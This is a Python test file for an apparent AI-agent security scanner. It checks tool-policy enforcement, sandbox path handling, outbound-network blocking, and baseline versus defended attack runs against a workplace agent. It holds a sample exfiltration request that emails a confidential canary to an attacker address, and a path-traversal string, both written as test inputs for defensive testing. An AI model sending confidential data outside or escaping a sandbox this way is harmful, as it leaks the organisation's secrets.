from __future__ import annotations

import asyncio
import unittest

from app.db.store import InMemoryStore
from app.models import AttackRun, OracleOutcome, PolicySet, RunStatus, ToolRequest
from app.services.fixtures import fixture_catalog
from app.services.oracle import evaluate
from app.services.policies import authorize
from app.services.runner import ScanRunner
from app.services.sandbox import SandboxState, ToolRuntime, safe_path


class PolicyAndSandboxTests(unittest.TestCase):
    def setUp(self) -> None:
        async def load():
            store = InMemoryStore()
            await store.seed()
            policy = await store.get("policy_sets", {"policy_set_id": "workplace-baseline"})
            return store, PolicySet.model_validate(policy)

        self.store, self.policy = asyncio.run(load())

    def test_external_confidential_send_is_detected_and_blocked(self) -> None:
        request = ToolRequest(
            name="send_email",
            arguments={"recipient": "attacker@outside.example.test", "body": "AB_CANARY_FINANCE_01"},
        )
        baseline = authorize(self.policy, request, {"data_classification": "confidential"}, enforce=False)
        defended = authorize(self.policy, request, {"data_classification": "confidential"}, enforce=True)
        self.assertTrue(baseline.allowed)
        self.assertEqual(baseline.matched_policy_ids, ["P-EMAIL-01"])
        self.assertFalse(defended.allowed)

    def test_internal_send_is_allowed_with_defense(self) -> None:
        request = ToolRequest(
            name="send_email",
            arguments={"recipient": "manager@corp.example.test", "body": "Internal summary"},
        )
        decision = authorize(self.policy, request, {"data_classification": "internal"}, enforce=True)
        self.assertTrue(decision.allowed)

    def test_path_traversal_is_denied(self) -> None:
        with self.assertRaises(ValueError):
            safe_path("/sandbox/reports/../../host.txt")

    def test_fixture_web_fetch_has_no_arbitrary_network(self) -> None:
        state = SandboxState.from_fixture("ws-test", fixture_catalog()["fixture-benign"])
        decision = authorize(
            self.policy,
            ToolRequest(name="fetch_webpage", arguments={"url": "https://unapproved.example"}),
            {},
            enforce=False,
        )
        result = ToolRuntime().execute(
            state,
            ToolRequest(name="fetch_webpage", arguments={"url": "https://unapproved.example"}),
            decision,
        )
        self.assertFalse(result.executed)
        self.assertIn("outbound network", result.result["reason"])


class RunnerTests(unittest.TestCase):
    def test_baseline_and_defended_outcomes_are_distinct(self) -> None:
        async def scenario():
            store = InMemoryStore()
            await store.seed()
            runner = ScanRunner(store)
            baseline = AttackRun(
                run_id="run-baseline-test",
                agent_id="workplace-agent-v1",
                suite_id="core-agent-security-v1",
                policy_set_id="workplace-baseline",
                status=RunStatus.QUEUED,
            )
            defended = AttackRun(
                run_id="run-defended-test",
                agent_id="workplace-agent-v1",
                suite_id="core-agent-security-v1",
                policy_set_id="workplace-baseline",
                defense_id="strict-tool-policy-v1",
                status=RunStatus.QUEUED,
            )
            await store.insert("runs", baseline.model_dump(mode="json"))
            await store.insert("runs", defended.model_dump(mode="json"))
            await runner.execute(baseline.run_id, 1)
            await runner.execute(defended.run_id, 1)
            return (
                await store.get("runs", {"run_id": baseline.run_id}),
                await store.get("runs", {"run_id": defended.run_id}),
                await store.list("attempts", {"run_id": defended.run_id}, limit=100),
            )

        baseline, defended, defended_attempts = asyncio.run(scenario())
        self.assertEqual(baseline["status"], RunStatus.COMPLETED.value)
        self.assertGreaterEqual(baseline["summary"]["verified_executed_violations"], 2)
        self.assertEqual(defended["summary"]["verified_executed_violations"], 0)
        self.assertGreaterEqual(defended["summary"]["blocked_attempts"], 2)
        outcomes = {item["oracle_result"]["outcome"] for item in defended_attempts}
        self.assertIn(OracleOutcome.POLICY_VIOLATION_BLOCKED.value, outcomes)
        self.assertIn(OracleOutcome.NO_VIOLATION_OBSERVED.value, outcomes)


if __name__ == "__main__":
    unittest.main()

